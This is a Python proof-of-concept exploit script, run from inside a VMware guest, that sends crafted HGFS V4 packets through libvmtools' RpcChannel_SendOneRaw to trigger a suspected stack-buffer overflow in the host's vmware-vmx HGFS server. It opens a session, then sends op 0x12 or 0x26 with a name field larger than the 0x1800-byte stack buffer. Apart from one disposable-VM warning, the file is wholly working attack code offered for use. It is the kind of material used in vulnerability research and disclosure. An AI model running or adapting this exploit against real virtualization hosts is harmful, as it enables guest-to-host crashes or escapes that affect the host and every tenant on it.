#!/usr/bin/env python3
"""
RPCI/libvmtools HGFS PoC for the vmware-vmx HGFS stack-overflow candidate.

Confirmed on Kali/open-vm-tools:

    Bool RpcChannel_SendOneRaw(const char *request, size_t requestLen,
                               char **reply, size_t *replyLen);

The explicit request length makes this binary-safe, so the HGFS V4 header can
contain NUL bytes.  The request is:

    "f " + <HGFS V4 packet>

Host-side path:

    RpcChannel_SendOneRaw
      -> RPCI channel
      -> guest RPC dispatcher 0x1400E8BE0
      -> command "f" handler 0x140143EF0
      -> HGFS server
      -> sub_14082A5E0 (op 0x12 / 0x26)

Run inside the Kali guest.  Only use against a disposable test VM.
"""

from __future__ import annotations

import argparse
import ctypes
import ctypes.util
import glob
import os
import shutil
import struct
import subprocess
import sys


V4_HEADER_SIZE = 0x34
V4_MAGIC = 0xFF

OP_SESSION_INIT = 0x29
OP_OVERFLOW_V3 = 0x12
OP_OVERFLOW_V4 = 0x26

STACK_BUFFER_SIZE = 0x1800


def build_v4_packet(op: int, session_id: int, payload: bytes, request_id: int = 1) -> bytes:
    total_size = V4_HEADER_SIZE + len(payload)
    header = bytearray(V4_HEADER_SIZE)
    header[0x00] = 1
    struct.pack_into("<I", header, 0x04, V4_MAGIC)
    struct.pack_into("<I", header, 0x08, total_size)
    struct.pack_into("<I", header, 0x0C, V4_HEADER_SIZE)
    struct.pack_into("<I", header, 0x10, request_id)
    struct.pack_into("<I", header, 0x14, op)
    struct.pack_into("<Q", header, 0x24, session_id)
    return bytes(header) + payload


def build_session_init_payload() -> bytes:
    return struct.pack("<III", 0, 0, 0)


def build_op12_payload(name1: bytes, name2: bytes) -> bytes:
    name1 = bytes(name1)
    name2 = bytes(name2)
    payload = bytearray(0x11 + len(name1) + len(name2))
    struct.pack_into("<I", payload, 0x08, len(name1))
    payload[0x0C : 0x0C + len(name1)] = name1
    struct.pack_into("<I", payload, 0x0D + len(name1), len(name2))
    payload[0x11 + len(name1) : 0x11 + len(name1) + len(name2)] = name2
    return bytes(payload)


def build_op26_payload(name1: bytes, name2: bytes) -> bytes:
    name1 = bytes(name1)
    name2 = bytes(name2)
    payload = bytearray(0x2D + len(name1) + len(name2))
    struct.pack_into("<I", payload, 0x08, len(name1))
    payload[0x0C] = 0
    payload[0x18 : 0x18 + len(name1)] = name1
    payload[0x18 + len(name1)] = 0
    struct.pack_into("<I", payload, 0x19 + len(name1), len(name2))
    payload[0x1D + len(name1) : 0x1D + len(name1) + len(name2)] = name2
    return bytes(payload)


def parse_hgfs_reply(packet: bytes) -> tuple[int, int, bytes]:
    if len(packet) < V4_HEADER_SIZE:
        raise ValueError("HGFS reply shorter than V4 header")
    magic = struct.unpack_from("<I", packet, 0x04)[0]
    total_size = struct.unpack_from("<I", packet, 0x08)[0]
    payload_offset = struct.unpack_from("<I", packet, 0x0C)[0]
    op = struct.unpack_from("<I", packet, 0x14)[0]
    if magic != V4_MAGIC:
        raise ValueError(f"unexpected HGFS V4 magic: {magic:#x}")
    if payload_offset < V4_HEADER_SIZE or payload_offset > len(packet):
        raise ValueError(f"invalid HGFS payload offset: {payload_offset:#x}")
    if total_size > len(packet):
        raise ValueError(f"HGFS total size {total_size:#x} exceeds reply {len(packet):#x}")
    return op, payload_offset, packet[payload_offset:total_size]


def candidate_libraries() -> list[str]:
    found: list[str] = []
    for name in ("libvmtools.so", "libvmtools.so.0", "libvmtools.so.1", "libvmtools.so.2"):
        path = ctypes.util.find_library(name)
        if path:
            found.append(path)

    for pattern in (
        "/usr/lib/*/libvmtools.so*",
        "/usr/lib/libvmtools.so*",
        "/usr/lib/vmware-tools/lib*/libvmtools.so*",
        "/usr/lib/vmware-tools/lib*/libvmtools/*.so*",
        "/usr/lib/x86_64-linux-gnu/libvmtools.so*",
    ):
        found.extend(glob.glob(pattern))

    seen = set()
    result = []
    for path in found:
        path = os.path.realpath(path)
        if path not in seen:
            seen.add(path)
            result.append(path)
    return result


def detect_shares() -> list[str]:
    """
    Read the guest share names using vmware-hgfsclient.

    The session-init reply exposes share ids/flags, not the guest share names,
    so the command-line tool is the simplest authoritative source.
    """
    exe = shutil.which("vmware-hgfsclient")
    if not exe:
        return []
    try:
        result = subprocess.run(
            [exe], capture_output=True, text=True, timeout=5
        )
    except (OSError, subprocess.TimeoutExpired):
        return []
    return [line.strip() for line in result.stdout.splitlines() if line.strip()]


def load_libvmtools() -> ctypes.CDLL:
    errors = []
    for path in candidate_libraries():
        try:
            lib = ctypes.CDLL(path)
            if hasattr(lib, "RpcChannel_SendOneRaw"):
                print(f"[+] loaded {path}")
                return lib
            errors.append(f"{path}: missing RpcChannel_SendOneRaw")
        except OSError as exc:
            errors.append(f"{path}: {exc}")
    raise RuntimeError(
        "could not load libvmtools with RpcChannel_SendOneRaw\n" + "\n".join(errors)
    )


def send_one_raw(lib: ctypes.CDLL, request: bytes) -> bytes:
    fn = lib.RpcChannel_SendOneRaw
    fn.argtypes = [
        ctypes.c_char_p,
        ctypes.c_size_t,
        ctypes.POINTER(ctypes.c_char_p),
        ctypes.POINTER(ctypes.c_size_t),
    ]
    fn.restype = ctypes.c_int

    buf = ctypes.create_string_buffer(request, len(request))
    reply = ctypes.c_char_p()
    reply_len = ctypes.c_size_t()

    ok = fn(buf, len(request), ctypes.byref(reply), ctypes.byref(reply_len))
    if not ok:
        raise RuntimeError("RpcChannel_SendOneRaw returned false")
    if not reply.value:
        raise RuntimeError("RpcChannel_SendOneRaw returned a null reply")

    return ctypes.string_at(reply, reply_len.value)


def rpc_call(lib: ctypes.CDLL, hgfs_packet: bytes) -> bytes:
    reply = send_one_raw(lib, b"f " + hgfs_packet)

    # The "f" command handler returns the binary HGFS reply directly.
    # RpcChannel_SendOneRaw does not add the textual "1 "/"0 " prefix that
    # the generic guest-RPC path uses for string commands.
    try:
        parse_hgfs_reply(reply)
        return reply
    except Exception:
        pass

    if len(reply) < 2:
        raise ValueError(f"short RPCI reply: {reply!r}")
    if reply[:2] == b"1 ":
        return reply[2:]
    if reply[:2] == b"0 ":
        raise RuntimeError(f"RPCI command failed: {reply[2:]!r}")
    raise ValueError(f"unexpected RPCI reply prefix: {reply[:16]!r}")


def test_rpc(lib: ctypes.CDLL) -> bool:
    request = b"info-get guestinfo.ip"
    reply = send_one_raw(lib, request)
    print(f"[+] info-get reply ({len(reply)} bytes): {reply!r}")
    return bool(reply)


def discover() -> int:
    print("[*] vmware-rpctool:", subprocess.run(
        ["which", "vmware-rpctool"], capture_output=True, text=True
    ).stdout.strip() or "not found")
    try:
        ldd = subprocess.run(["ldd", "/usr/bin/vmware-rpctool"], capture_output=True, text=True)
        print("[*] ldd vmware-rpctool:\n" + ldd.stdout)
    except OSError as exc:
        print(f"[!] ldd failed: {exc}")

    for path in candidate_libraries():
        print(f"[*] candidate: {path}")
        try:
            nm = subprocess.run(
                ["nm", "-D", "--defined-only", path],
                capture_output=True,
                text=True,
            )
            lines = [line for line in nm.stdout.splitlines() if "RpcChannel" in line]
            print("\n".join(lines) if lines else "    (no RpcChannel symbols)")
        except OSError as exc:
            print(f"    nm failed: {exc}")

    try:
        lib = load_libvmtools()
        test_rpc(lib)
    except Exception as exc:
        print(f"[!] SendOneRaw test failed: {exc}")
        return 1
    return 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--discover", action="store_true")
    parser.add_argument("--test-rpc", action="store_true")
    parser.add_argument("--session-id", type=lambda s: int(s, 0), default=0)
    parser.add_argument("--op", type=lambda s: int(s, 0), default=OP_OVERFLOW_V3)
    parser.add_argument("--len", type=lambda s: int(s, 0), default=0x2000)
    parser.add_argument(
        "--share",
        default=None,
        help="guest share name; default: auto-detect via vmware-hgfsclient",
    )
    parser.add_argument("--path", default="A", help="path inside the share")
    parser.add_argument("--send-overflow", action="store_true")
    args = parser.parse_args()

    if args.discover:
        return discover()

    if args.len <= STACK_BUFFER_SIZE:
        parser.error("--len must be greater than 0x1800")
    if args.op not in (OP_OVERFLOW_V3, OP_OVERFLOW_V4):
        parser.error("--op must be 0x12 or 0x26")

    lib = load_libvmtools()

    if args.test_rpc:
        test_rpc(lib)
        return 0

    shares = detect_shares()
    if shares:
        print(f"[+] vmware-hgfsclient shares: {shares}")
    if args.share:
        share = args.share
    elif shares:
        share = shares[0]
        if len(shares) > 1:
            print(f"[!] multiple shares detected; using the first: {share!r}")
    else:
        share = "share"
        print("[!] vmware-hgfsclient returned no shares; falling back to 'share'")

    session_id = args.session_id

    if session_id == 0:
        print("[*] sending HGFS op 0x29 session init")
        init_packet = build_v4_packet(OP_SESSION_INIT, 0, build_session_init_payload())
        init_reply = rpc_call(lib, init_packet)
        print(
            f"[+] raw session-init reply: {len(init_reply):#x} bytes, "
            f"header={init_reply[:16].hex()}"
        )
        op, payload_offset, payload = parse_hgfs_reply(init_reply)
        print(
            f"[+] session-init reply: op={op:#x} "
            f"payload_offset={payload_offset:#x} payload_len={len(payload):#x}"
        )
        if len(payload) < 8:
            raise ValueError("session-init reply payload is shorter than 8 bytes")
        session_id = struct.unpack_from("<Q", payload, 0)[0]
        print(f"[+] session id: {session_id:#x}")
        if len(payload) >= 12:
            share_count = struct.unpack_from("<I", payload, 8)[0]
            print(f"[+] share count: {share_count}")
            if share_count:
                entries = payload[28 : 28 + 8 * share_count]
                print(f"[+] share entries (first 64 bytes): {entries[:64].hex()}")

    if not args.send_overflow:
        print("[*] session established; rerun with --send-overflow")
        return 0

    # HGFS CPName components are separated by NUL bytes.  The first component
    # must be the guest share name, not just an arbitrary file name.
    name1 = share.encode() + b"\x00" + args.path.encode()
    name2 = b"B" * args.len
    if args.op == OP_OVERFLOW_V3:
        payload = build_op12_payload(name1, name2)
    else:
        payload = build_op26_payload(name1, name2)
    overflow_packet = build_v4_packet(args.op, session_id, payload)

    print(
        f"[*] sending overflow: op={args.op:#x} "
        f"hgfs_len={len(overflow_packet):#x} name2_len={args.len:#x}"
    )
    reply = rpc_call(lib, overflow_packet)
    print(f"[+] reply received, {len(reply):#x} bytes")
    if len(reply) >= V4_HEADER_SIZE:
        status = struct.unpack_from("<I", reply, 0x18)[0]
        status2 = struct.unpack_from("<I", reply, 0x20)[0]
        print(f"[+] reply status: {status} (0x{status:x}), status2: {status2} (0x{status2:x})")
        print(f"[+] raw reply: {reply.hex()}")
    try:
        op, off, payload = parse_hgfs_reply(reply)
        print(f"[+] reply op={op:#x} payload_offset={off:#x} payload_len={len(payload):#x}")
    except Exception as exc:
        print(f"[!] reply parse error: {exc}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
